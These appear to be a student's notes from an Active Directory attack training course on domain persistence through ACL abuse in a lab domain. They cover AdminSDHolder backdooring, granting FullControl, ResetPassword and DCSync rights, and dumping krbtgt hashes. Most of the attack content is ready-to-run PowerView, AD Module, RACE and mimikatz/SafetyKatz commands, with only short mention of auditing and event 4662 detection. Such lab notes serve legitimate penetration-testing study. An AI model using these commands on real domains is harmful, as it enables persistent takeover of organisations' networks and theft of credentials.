### 34.1 - Persistence using ACLs - AdminSDHolder
_______________________________________________________________________
#### AdminSDHolder
- The AdminSDHolder resides in the 'System' container of a domain controller and is used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).
- A process called "Security Descriptor Propagator" (SDPROP) runs every hour (by default) and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.

#### What groups are considered to be Protected Groups?
- ![[Pasted image 20250801020307.png]]
- Why do these groups have to be considered Protected Groups?
	- Some groups other than administrator groups are also considered protected groups because there are some well known abuse techniques targeting them.
	- ![[Pasted image 20250801020421.png]]

#### Mitigation for DA persistence using AdminSDHolder
- Protect your DAs.
- Turn on auditing for any changes made to AdminSDHolder.

#### Performing the attack (with RDP access on the DC)
- With DA privileges (Full Control/Write permissions), we can modify the ACL actually present in AdminSDHolder, and add a user that we control with Full Permissions (or other interesting permissions), which would lead to SDPROP overwriting the ACLs of the protected groups with the malicious changes we just made.
- AdminSDHolder has no special protection, not even a special logging mechanism, by default; if we have DA privileges, we can just go to the ACL (under the Security tab after navigating to AdminSDHolder's properties) and add permissions (Full Control) for a user that we control (studentX).
	- It does not even have a WriteDACL log, which occurs even when we just make a change to the ACL of any domain object, a `4662 - Domain Object Access` log is generated, which very clearly logs that an administrator has executed WriteDACL on the object.
- This ACL should propagate to the protected groups within an hour, but if we want to trigger propagation manually, we need to:
	- Initiate a PowerShell session as the DA on the DC. (We should already have DA privileges since we are working towards establishing persistence.)
		- `$sess = New-PSSession -ComputerName dcorp-dc`
	- Next, we need to execute the `Invoke-SDPropagator.ps1` script:
		- `Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-SDPropagator.ps1`
		- This script manually trigger propagation.
- On the DC, we should now see that the ACL for all the Protected Groups, and their members, reflect the malicious changes we made to the ACL of AdminSDHolder.

#### Performing this attack using PowerShell (without RDP access on the DC):
- Using PowerView:
	- `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
	- Other interesting permissions (`ResetPassword`, `WriteMembers`) we can add for a user to the AdminSDHolder:
		- `ResetPassword`:
			- `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
			- Note that there is difference between changing a password and resetting a password, we need to know the previous password to change a password, but that is not true in the case of resetting a password.
		- `WriteMembers`:
			- `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
- Using MS AD Module and RACE toolkit (https://github.com/samratashok/RACE):
	- `Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose`
- Executing `Invoke-SDPropagator.ps1` to trigger propagation on the malicious ACL:
	- `C:\AD\Tools\Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose`
	- For pre-Server 2008 machines:
		- `Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose`
- Once the propagation process completes, we can verify that the permissions have been modified to reflect the changes we made in the following ways:
	- Using PowerView as a normal user:
		- `Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-MemberNoteProperty 'IdentityName' $(Convert-SidToName$_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentX"}`
		- This command retrieves the ACL for the DA group, then for each of the entry it converts the Security Identifier to an Identity Name, and then filters the Identity Names to check if an entry has been added for "studentX".
	- Using AD Module:
		- `(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'studentX'}
- Actually abusing the privileges we bestowed upon the user we control:
	- Abusing `FullControl`:
		- Adding domain group member using PowerView:
			- `Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`
		- Adding domain group member using AD Module:
			- `Add-ADGroupMember -Identity 'Domain Admins' -Members testda`
	- Abusing `ResetPassword`:
		- Using PowerView:
			- `Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`
		- Using AD Module:
			- `Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`

### 34.2 - Persistence using ACLs - Rights Abuse
_______________________________________________________________________
- We can modify the ACL for specific domain objects too. There are even more interesting object-specific ACLs that can be abused.
- Fortunately for Defenders, when we make any changes to the ACL of a domain object, it gets logged, as `4662 - Directory Object Access`, which mentions that the administrator executed WriteDACL on the object.
	- This means that administrators can have alerts based on these logs to detect this attack.
- For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like `FullControl` or the ability to run "DCSync":
	- Add `FullControl` rights:
		- Using PowerView:
			- `Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
		- Using AD Module and RACE:
			- `Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose`
	- Add rights for DCSync:
		- The DCSync attack requires two specific rights, `Replicating Directory Changes`, and `Replicating Directory Changes All`, which can be abbreviated as DCSync itself in some cases.
		- Using PowerView:
			- `Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
		- Using AD Module and RACE:
			- `Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose`
	- Performing DCSync Attack:
		- Using mimikatz:
			- `Invoke-Mimikatz -Command '"lsadump::dcsync/user:dcorp\krbtgt"'`
		- Using SafetyKatz:
			- `C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync/user:dcorp\krbtgt" "exit"`

### 34.3 - Learning Objective 12
_______________________________________________________________________
- Check if studentX has Replication (DCSync) rights.
- If yes, execute the DCSync attack to pull hashes of the krbtgt user.
- If no, add the replication rights for the studentX and execute the DCSync attack to pull hashes of the krbtgt user.